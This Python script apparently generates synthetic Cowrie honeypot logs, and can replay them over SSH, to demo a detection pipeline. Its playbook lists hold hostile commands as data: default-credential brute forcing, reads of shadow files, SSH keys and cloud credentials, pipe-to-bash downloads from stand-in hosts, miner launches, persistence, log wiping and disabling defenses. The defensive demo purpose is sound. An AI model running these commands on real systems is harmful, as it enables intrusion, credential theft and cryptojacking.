#!/usr/bin/env python3
"""Honeypot attack generator — 5-stage realistic attack chain for pipeline demos.

Stages (most common honeypot attacks observed in the wild):
  1. BRUTE FORCE      — credential spraying (28 common pairs)
  2. RECONNAISSANCE    — host enumeration, network discovery, user/process listing
  3. MALWARE DOWNLOAD  — payload retrieval via wget, curl, tftp, inline pipes
  4. CRYPTOMINING      — XMRig deployment, pool connection, miner persistence
  5. PERSISTENCE       — SSH keys, crontab, systemd, rc.local + log wiping

Usage:
    # Full 5-stage chain (default)
    python3 scripts/honeypot-attack.py --output /tmp/attack.json --sessions 3

    # Single stage
    python3 scripts/honeypot-attack.py --output /tmp/recon.json --stage recon --sessions 10

    # Feed into pipeline
    normalize-cowrie /tmp/attack.json --db data/honeypot.db

All IPs and domains use documentation-safe ranges (RFC 5737 / RFC 6761).
Never connects to real servers — generates Cowrie JSONL only.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import socket
import subprocess
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

# ═══════════════════════════════════════════════════════════════════════
#  Safe ranges — never touch real infrastructure
# ═══════════════════════════════════════════════════════════════════════

_SAFE_IPS = [
    f"192.0.2.{n}" for n in range(1, 254)
] + [
    f"198.51.100.{n}" for n in range(1, 254)
] + [
    f"203.0.113.{n}" for n in range(1, 254)
]

_SAFE_DOMAINS = [
    "bad.example.com",
    "evil.example.com",
    "dropper.example.com",
    "paste.example.com",
    "pool.example.com",
    "c2.example.com",
    "malware.example.net",
    "exfil.example.com",
    "miner.example.net",
    "scanner.example.com",
]

# ═══════════════════════════════════════════════════════════════════════
#  Credential lists — real-world brute-force patterns
# ═══════════════════════════════════════════════════════════════════════

BRUTE_CREDS: list[tuple[str, str]] = [
    ("root", "root"),         ("root", "admin"),
    ("root", "123456"),       ("root", "password"),
    ("root", "toor"),         ("root", "raspberry"),
    ("root", "12345678"),     ("root", "qwerty"),
    ("root", "password123"),  ("root", "admin123"),
    ("admin", "admin"),       ("admin", "123456"),
    ("admin", "password"),    ("admin", "admin123"),
    ("ubuntu", "ubuntu"),     ("ubuntu", "123456"),
    ("pi", "raspberry"),      ("pi", "raspberrypi"),
    ("test", "test"),         ("user", "123456"),
    ("oracle", "oracle"),     ("postgres", "postgres"),
    ("git", "git"),           ("debian", "debian"),
    ("guest", "guest"),       ("mysql", "mysql"),
    ("tomcat", "tomcat"),     ("nagios", "nagios"),
    ("support", "support"),   ("ftpuser", "ftpuser"),
]

# ═══════════════════════════════════════════════════════════════════════
#  Attack Playbooks
# ═══════════════════════════════════════════════════════════════════════

STAGE_1_BRUTE_FORCE: list[str] = [
    # After successful login, immediately check access
    "whoami",
    "id",
    "uname -a",
    "hostname",
    "cat /proc/cpuinfo 2>/dev/null | head -3",
    "free -m",
    "df -h",
    "exit",
]

STAGE_2_RECON: list[str] = [
    # ── Identity ──
    "whoami",
    "id",
    "hostname",
    "uname -a",
    "cat /etc/issue 2>/dev/null",
    "cat /etc/*-release 2>/dev/null",
    # ── Hardware ──
    "cat /proc/cpuinfo 2>/dev/null | head -5",
    "cat /proc/meminfo 2>/dev/null | head -5",
    "free -m",
    "df -h",
    "lsblk",
    "lscpu",
    "dmidecode -t system 2>/dev/null",
    "systemd-detect-virt 2>/dev/null",
    # ── Network ──
    "ifconfig 2>/dev/null || ip addr",
    "ip route 2>/dev/null",
    "netstat -tulpn 2>/dev/null || ss -tulpn",
    "arp -a 2>/dev/null",
    "cat /etc/hosts 2>/dev/null",
    "cat /etc/resolv.conf 2>/dev/null",
    # ── Processes & Services ──
    "ps aux 2>/dev/null | head -15",
    "ps -ef 2>/dev/null | head -15",
    "ls -la /etc/init.d/ 2>/dev/null | head -10",
    "systemctl list-units --type=service 2>/dev/null | head -10",
    "service --status-all 2>/dev/null | head -10",
    # ── Users & Access ──
    "cat /etc/passwd",
    "cat /etc/group 2>/dev/null | head -10",
    "cat /etc/shadow 2>/dev/null | head -5",
    "ls -la /home",
    "ls -la /root 2>/dev/null",
    "w 2>/dev/null",
    "last 2>/dev/null | head -10",
    "lastlog 2>/dev/null | head -10",
    # ── Network Scanning ──
    "nmap -sV 192.168.1.0/24 2>/dev/null | head -20",
    "nc -zv 10.0.0.5 22 2>/dev/null",
    "nc -zv 10.0.0.5 3306 2>/dev/null",
    # ── Credential Harvesting ──
    "cat /etc/shadow 2>/dev/null | grep -v '!' | grep -v '*'",
    "cat ~/.ssh/id_rsa 2>/dev/null",
    "cat ~/.ssh/id_dsa 2>/dev/null",
    "ls -la ~/.ssh/ 2>/dev/null",
    "cat ~/.bash_history 2>/dev/null | tail -30",
    "cat ~/.mysql_history 2>/dev/null",
    "grep -r 'password' /etc/ 2>/dev/null | head -5",
    "find / -name '*.key' -type f 2>/dev/null | head -5",
    "cat ~/.aws/credentials 2>/dev/null",
    "env 2>/dev/null | grep -i 'pass\\|key\\|token\\|secret'",
    # ── Cloud Metadata ──
    "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null",
    "curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google' 2>/dev/null",
]

STAGE_3_DOWNLOAD: list[str] = [
    "wget http://{domain}/payload.sh -O /tmp/payload.sh",
    "wget http://{domain}/xmrig.tar.gz -O /tmp/.x.tar.gz 2>/dev/null",
    "wget http://{domain}/backdoor.elf -O /tmp/.backdoor 2>/dev/null",
    "curl -s http://{domain}/backdoor.py -o /tmp/.backdoor.py",
    "curl -sL http://{domain}/setup.sh -o /tmp/setup.sh",
    "curl -fsSL http://{domain}/install.sh | bash",
    "curl -s http://{domain}/scanner.sh 2>/dev/null | sh",
    "wget http://{domain}/r/abc123 -O /tmp/setup.sh && chmod +x /tmp/setup.sh && /tmp/setup.sh",
    "curl -o /tmp/.cron.sh http://{domain}/cron.sh 2>/dev/null",
    "wget -qO- http://{domain}/config.json 2>/dev/null > /tmp/cfg.json",
    "tftp -g -r payload.elf {ip} 2>/dev/null",
    "busybox wget http://{domain}/busybox -O /tmp/busybox 2>/dev/null",
    "curl -s http://{domain}/script.b64 2>/dev/null | base64 -d | bash",
    "wget http://{domain}/miner.tar.gz -O /tmp/.miner.tar.gz 2>/dev/null",
]

STAGE_4_CRYPTOMINING: list[str] = [
    "tar xzf /tmp/.x.tar.gz -C /tmp/ 2>/dev/null",
    "tar xzf /tmp/.miner.tar.gz -C /tmp/ 2>/dev/null",
    "chmod +x /tmp/xmrig",
    "/tmp/xmrig --url=pool.{domain}:4444 --algo=rx/0 --user=4AbCDeFg12345garbage --pass=x --tls 2>/dev/null &",
    "/tmp/xmrig -o stratum+tcp://pool.{domain}:3333 -u wallet123 -p x --donate-level=0 2>/dev/null &",
    "nohup /tmp/xmrig -c /tmp/.cfg.json >/dev/null 2>&1 &",
    "curl -s http://{domain}/config.json -o /tmp/.cfg.json 2>/dev/null",
    "/tmp/xmrig --url={domain}:5555 --coin=monero --threads=$(nproc) 2>/dev/null &",
    "./cpuminer --algo=cryptonight --url=pool.{domain}:5555 --userpass=wallet:x 2>/dev/null &",
    "./minerd -o stratum+tcp://pool.{domain}:3333 -u wallet -p x 2>/dev/null &",
    "./kinsing -pool pool.{domain}:4444 -wallet 4AbCDeFg12345garbage 2>/dev/null &",
    "chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi 2>/dev/null &",
    "./t-rex -a ethash -o stratum+tcp://pool.{domain}:4444 -u wallet -p x 2>/dev/null &",
    "./lolminer --algo ETHASH --pool pool.{domain}:4444 --user wallet 2>/dev/null &",
    "./nbminer -a ethash -o stratum+tcp://pool.{domain}:4444 -u wallet 2>/dev/null &",
    "./gminer --algo ethash --server pool.{domain} --port 4444 --user wallet 2>/dev/null &",
    "./phoenixminer -pool pool.{domain}:4444 -wal wallet 2>/dev/null &",
    "curl -sL http://{domain}/miner.sh | bash 2>/dev/null",
]

STAGE_5_PERSISTENCE: list[str] = [
    # ── Cron jobs ──
    "echo '*/5 * * * * /tmp/.backdoor.sh' | crontab - 2>/dev/null",
    "(crontab -l 2>/dev/null; echo '@reboot /tmp/.init.sh') | crontab - 2>/dev/null",
    "echo '@daily /tmp/xmrig -c /tmp/.cfg.json >/dev/null 2>&1' | crontab - 2>/dev/null",
    # ── SSH key planting ──
    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...attacker@kali' >> ~/.ssh/authorized_keys 2>/dev/null",
    "chmod 600 ~/.ssh/authorized_keys 2>/dev/null",
    # ── Binary setup ──
    "chmod +x /tmp/payload.sh",
    "chmod +x /tmp/.backdoor.py",
    "chmod +x /tmp/.backdoor",
    "nohup /tmp/payload.sh >/dev/null 2>&1 &",
    "nohup /tmp/.backdoor >/dev/null 2>&1 &",
    # ── Systemd backdoor ──
    "cat > /etc/systemd/system/backdoor.service << 'EOF'\n[Unit]\nDescription=System Service\n[Service]\nExecStart=/tmp/.backdoor.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF",
    "systemctl daemon-reload 2>/dev/null",
    "systemctl enable backdoor.service 2>/dev/null",
    # ── rc.local ──
    "echo '/tmp/payload.sh &' >> /etc/rc.local 2>/dev/null",
    # ── .bashrc backdoor ──
    "echo '/tmp/.backdoor.py &' >> ~/.bashrc 2>/dev/null",
    "echo 'export LD_PRELOAD=/tmp/libevil.so' >> ~/.bashrc 2>/dev/null",
    # ── Cover tracks ──
    "cat /dev/null > /var/log/auth.log 2>/dev/null",
    "cat /dev/null > /var/log/syslog 2>/dev/null",
    "cat /dev/null > ~/.bash_history 2>/dev/null",
    "> /var/log/wtmp 2>/dev/null",
    "history -c",
    "unset HISTFILE",
    "export HISTFILE=/dev/null",
    "rm -rf /tmp/.* 2>/dev/null",
    "truncate -s 0 /var/log/syslog 2>/dev/null",
    # ── Disable defenses ──
    "ufw disable 2>/dev/null",
    "setenforce 0 2>/dev/null",
    "systemctl stop rsyslog 2>/dev/null",
    "iptables -F 2>/dev/null",
]

# ═══════════════════════════════════════════════════════════════════════
#  Stage Registry
# ═══════════════════════════════════════════════════════════════════════

STAGES: dict[str, tuple[str, list[str]]] = {
    "brute-force":    ("Brute Force Attack",        STAGE_1_BRUTE_FORCE),
    "recon":          ("Host Reconnaissance",        STAGE_2_RECON),
    "download":       ("Malware Download",           STAGE_3_DOWNLOAD),
    "cryptomining":   ("Cryptomining Deployment",    STAGE_4_CRYPTOMINING),
    "persistence":    ("Persistence & Cover-up",     STAGE_5_PERSISTENCE),
}

FULL_CHAIN_ORDER = ["brute-force", "recon", "download", "cryptomining", "persistence"]

# ═══════════════════════════════════════════════════════════════════════
#  Generator Engine
# ═══════════════════════════════════════════════════════════════════════

def _safe_ip() -> str:
    return random.choice(_SAFE_IPS)


def _safe_domain() -> str:
    return random.choice(_SAFE_DOMAINS)


def _fmt(cmd: str, ip: str, domain: str) -> str:
    return cmd.format(ip=ip, domain=domain, port=random.randint(1024, 65535))


def _event(eventid: str, session_id: str, src_ip: str, ts: datetime,
           **extra: Any) -> dict[str, Any]:
    ev: dict[str, Any] = {
        "eventid": eventid,
        "timestamp": ts.isoformat(),
        "src_ip": src_ip,
        "session": session_id,
        "protocol": "ssh",
    }
    ev.update(extra)
    return ev


def generate_attack(
    output_path: str,
    sessions: int,
    source_ip: str | None,
    stages: list[str],
) -> int:
    """Generate Cowrie JSONL for the selected attack stages.

    Each session = 1 attacker IP running through all stages in order.
    Returns total event count.
    """
    events: list[dict[str, Any]] = []
    now = datetime.now(timezone.utc)
    written = 0

    for s in range(sessions):
        ip = source_ip or _safe_ip()
        domain = _safe_domain()
        sid = f"attack-{s:04d}"
        user, pw = random.choice(BRUTE_CREDS)
        t = now + timedelta(seconds=s * random.randint(60, 180))

        # ── Session connect ─────────────────────────────────────────
        events.append(_event("cowrie.session.connect", sid, ip, t))
        written += 1; t += timedelta(seconds=2)

        # ── Login attempts (1-4 failed, then success) ───────────────
        for _ in range(random.randint(1, 4)):
            fu, fp = random.choice(BRUTE_CREDS)
            events.append(_event("cowrie.login.failed", sid, ip, t,
                                 username=fu, password=fp))
            written += 1; t += timedelta(seconds=random.randint(2, 5))

        events.append(_event("cowrie.login.success", sid, ip, t,
                             username=user, password=pw))
        written += 1; t += timedelta(seconds=3)

        # ── Run each stage ─────────────────────────────────────────
        for stage_name in stages:
            stage_info = STAGES.get(stage_name)
            if stage_info is None:
                continue
            _label, playbook = stage_info
            cmds = list(playbook)
            random.shuffle(cmds)
            for cmd_template in cmds:
                cmd = _fmt(cmd_template, ip, domain)
                events.append(_event("cowrie.command.input", sid, ip, t,
                                     input=cmd))
                written += 1
                t += timedelta(seconds=random.randint(2, 15))

        # ── Session close ───────────────────────────────────────────
        events.append(_event("cowrie.session.closed", sid, ip, t))
        written += 1

    # ── Write JSONL ────────────────────────────────────────────────
    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "a") as f:
        for ev in events:
            f.write(json.dumps(ev) + "\n")

    return written


# ═══════════════════════════════════════════════════════════════════════
#  Live SSH attack — PTY-based SSH against a real Cowrie honeypot
# ═══════════════════════════════════════════════════════════════════════

def _human_delay(min_s: float = 1.0, max_s: float = 4.0) -> None:
    time.sleep(random.uniform(min_s, max_s))


def run_live_attack_session(
    host: str,
    port: int,
    username: str,
    password: str,
    commands: list[str],
    connect_timeout: int = 10,
    session_num: int = 0,
    total_sessions: int = 1,
) -> bool:
    """Open an interactive SSH session against Cowrie and run attack commands.

    Uses sshpass + ssh with a PTY so Cowrie captures every command naturally.
    Returns True if the session completed (even if some commands failed).

    For live mode, commands are capped and delays shortened to keep demos snappy.
    """
    import pty as _pty

    domain = random.choice(_SAFE_DOMAINS)
    ip = host

    # Cap commands and sample for live sessions (keeps demo time reasonable)
    max_cmds = 20
    if len(commands) > max_cmds:
        commands = random.sample(commands, max_cmds)
    host_short = host.replace(".", "-")

    try:
        master_fd, slave_fd = _pty.openpty()
        proc = subprocess.Popen(
            [
                "sshpass", "-p", password,
                "ssh", "-tt",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", f"ConnectTimeout={connect_timeout}",
                "-p", str(port),
                f"{username}@{host}",
            ],
            stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
            close_fds=True,
        )
        os.close(slave_fd)

        # Wait for shell prompt
        _human_delay(1.0, 2.0)

        for cmd_template in commands:
            cmd = cmd_template.format(ip=ip, domain=domain, port=random.randint(1024, 65535))
            os.write(master_fd, (cmd + "\n").encode())
            _human_delay(1.0, 3.0)

        os.write(master_fd, b"exit\n")
        _human_delay(0.3, 0.6)

        try:
            proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

        os.close(master_fd)

        print(f"  [{session_num}/{total_sessions}] {username}:{password} — OK ({len(commands)} cmds)")
        return True

    except FileNotFoundError:
        print("  ✗ sshpass not found. Install: sudo apt-get install sshpass")
        return False
    except OSError as exc:
        print(f"  [{session_num}/{total_sessions}] {username}:{password} — ERR: {exc}")
        return False


# ═══════════════════════════════════════════════════════════════════════
#  Live injection into running pipeline
# ═══════════════════════════════════════════════════════════════════════

_COWRIE_LOG_FILE = "cowrie.json"


def _get_cowrie_volume_name() -> str | None:
    """Return the Docker volume name for the Cowrie logs, or None if not found."""
    # Use script's parent directory as project root, not cwd.
    # This survives being run from any subdirectory.
    try:
        script_dir = Path(__file__).resolve().parent
        project_root = script_dir.parent.name
    except (NameError, AttributeError):
        project_root = Path.cwd().name
    project = os.environ.get("COMPOSE_PROJECT_NAME", project_root)
    volume = f"{project}_cowrie-logs"
    try:
        result = subprocess.run(
            ["docker", "volume", "inspect", volume],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode == 0:
            return volume
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return None


def inject_to_live_pipeline(filepath: Path) -> bool:
    """Append a Cowrie JSONL file into the running pipeline's log volume.

    Uses a throwaway busybox container to write into the Docker volume,
    since the volume is root-owned and the pipeline follower watches it live.
    """
    volume = _get_cowrie_volume_name()
    if volume is None:
        print("  ✗ Cannot find Cowrie log volume. Is 'docker compose up -d' running?")
        return False

    filepath = filepath.resolve()
    if not filepath.exists():
        print(f"  ✗ File not found: {filepath}")
        return False

    line_count = 0
    with open(filepath, "r") as fh:
        for _ in fh:
            line_count += 1

    try:
        with open(filepath, "r") as fh:
            result = subprocess.run(
                [
                    "docker", "run", "--rm", "-i",
                    "-v", f"{volume}:/logs",
                    "busybox",
                    "sh", "-c", f"cat >> /logs/{_COWRIE_LOG_FILE}",
                ],
                stdin=fh,
                capture_output=True,
                text=True,
                timeout=30,
            )
        if result.returncode != 0:
            print(f"  ✗ Injection failed: {result.stderr.strip()}")
            return False
    except FileNotFoundError:
        print("  ✗ Docker not found. Is it installed and running?")
        return False
    except subprocess.TimeoutExpired:
        print("  ✗ Docker injection timed out.")
        return False

    print(f"  ✓ Injected {line_count} events into live pipeline")
    print(f"  → Dashboard: http://localhost:5173")
    return True


# ═══════════════════════════════════════════════════════════════════════
#  CLI
# ═══════════════════════════════════════════════════════════════════════

def main() -> int:
    parser = argparse.ArgumentParser(
        description="Honeypot attack generator — 5-stage realistic attack chain.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Full 5-stage chain (default)
    %(prog)s --output /tmp/attack.json --sessions 3

    # Reconnaissance only, 10 sessions
    %(prog)s --output /tmp/recon.json --stage recon --sessions 10

    # Malware download + cryptomining only
    %(prog)s --output /tmp/malware.json --stage download --stage cryptomining

    # Pipe directly into the pipeline
    %(prog)s --output /tmp/attack.json --sessions 5
    normalize-cowrie /tmp/attack.json --db data/honeypot.db
""",
    )
    parser.add_argument(
        "--output", default=None, metavar="PATH",
        help="Output Cowrie JSONL file (appends if exists). Required unless --list-stages.",
    )
    parser.add_argument(
        "--sessions", type=int, default=3,
        help="Number of attack sessions to generate (default: 3)",
    )
    parser.add_argument(
        "--stage", action="append", dest="stages", metavar="STAGE",
        choices=list(STAGES.keys()),
        help="Attack stage(s) to include. Repeat for multiple. "
             "Default: all 5 stages in chain order.",
    )
    parser.add_argument(
        "--source-ip", default=None,
        help="Fixed source IP (default: random from RFC 5737 ranges)",
    )
    parser.add_argument(
        "--list-stages", action="store_true",
        help="List available stages and exit",
    )
    parser.add_argument(
        "--live", action="store_true",
        help="Auto-inject generated events into the running Docker pipeline "
             "(appends to the Cowrie log volume so the dashboard updates live).",
    )
    parser.add_argument(
        "--host", default=None, metavar="HOST",
        help="Live SSH attack: connect to this Cowrie honeypot and run the "
             "playbook via Paramiko (e.g. --host 192.168.1.79). "
             "Cowrie logs the session automatically — no --live or --output needed.",
    )
    parser.add_argument(
        "--port", type=int, default=2222,
        help="SSH port for live attacks (default: 2222)",
    )

    args = parser.parse_args()

    if args.list_stages:
        print("\nAvailable attack stages:\n")
        for key, (label, cmds) in STAGES.items():
            print(f"  {key:<18} {label:<30} ({len(cmds)} commands)")
        print(f"\n  {'full-chain':<18} {'All 5 stages in order':<30} "
              f"({sum(len(STAGES[k][1]) for k in FULL_CHAIN_ORDER)} commands)")
        print()
        return 0

    stages = args.stages if args.stages else FULL_CHAIN_ORDER

    # ── Live SSH mode ─────────────────────────────────────────────────
    if args.host:
        print(f"\n{'='*65}")
        print(f"  HONEYPOT ATTACK — LIVE SSH")
        print(f"{'='*65}")
        print(f"  Target:    {args.host}:{args.port}")
        print(f"  Sessions:  {args.sessions}")
        print(f"  Stages:")
        for name in stages:
            label, cmds = STAGES[name]
            print(f"    {name:<15} → {label} ({len(cmds)} variations)")
        print(f"  Total command pool: {sum(len(STAGES[n][1]) for n in stages)}")
        print(f"{'='*65}\n")

        success = 0
        failed = 0
        for s in range(args.sessions):
            username, password = random.choice(BRUTE_CREDS)
            # Run all stages' commands in sequence for this session
            all_cmds: list[str] = []
            for stage_name in stages:
                stage_info = STAGES.get(stage_name)
                if stage_info:
                    all_cmds.extend(stage_info[1])

            ok = run_live_attack_session(
                host=args.host, port=args.port,
                username=username, password=password,
                commands=all_cmds,
                session_num=s + 1, total_sessions=args.sessions,
            )
            if ok:
                success += 1
            else:
                failed += 1
            if s < args.sessions - 1:
                time.sleep(random.uniform(1.0, 3.0))

        print(f"\n  ✓ {success} sessions succeeded, {failed} failed")
        print(f"  → Dashboard: http://{args.host}:5173/dashboard")
        print(f"  → Grafana:   http://{args.host}:3000\n")
        return 0

    # ── Offline mode ──────────────────────────────────────────────────
    if not args.output:
        if args.live:
            ts = datetime.now().strftime("%Y%m%d-%H%M%S")
            args.output = f"/tmp/honeypot-attack-{ts}.json"
        else:
            parser.error("--output is required (unless --list-stages or --host)")

    # Print plan
    print(f"\n{'='*65}")
    print(f"  HONEYPOT ATTACK GENERATOR")
    print(f"{'='*65}")
    print(f"  Output:    {args.output}")
    print(f"  Sessions:  {args.sessions}")
    print(f"  Source IP: {args.source_ip or 'random (RFC 5737)'}")
    print(f"  Stages:")
    for name in stages:
        label, cmds = STAGES[name]
        print(f"    {name:<15} → {label} ({len(cmds)} variations)")
    total_cmds = sum(len(STAGES[n][1]) for n in stages)
    print(f"  Total command pool: {total_cmds}")
    print(f"{'='*65}\n")

    # Generate
    written = generate_attack(args.output, args.sessions, args.source_ip, stages)

    print(f"  ✓ {written} Cowrie JSON events written to {args.output}")
    print(f"  ✓ {args.sessions} sessions × {len(stages)} stages")

    if args.live:
        print()
        inject_to_live_pipeline(Path(args.output))
    else:
        print(f"\n  → Feed to dashboard:")
        print(f"    normalize-cowrie {args.output} --db data/honeypot.db")
        print(f"    honeypot-dashboard --records-file data/records.jsonl --db data/honeypot.db")
        print(f"\n  → Or add --live to auto-inject into the running pipeline")
    print()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
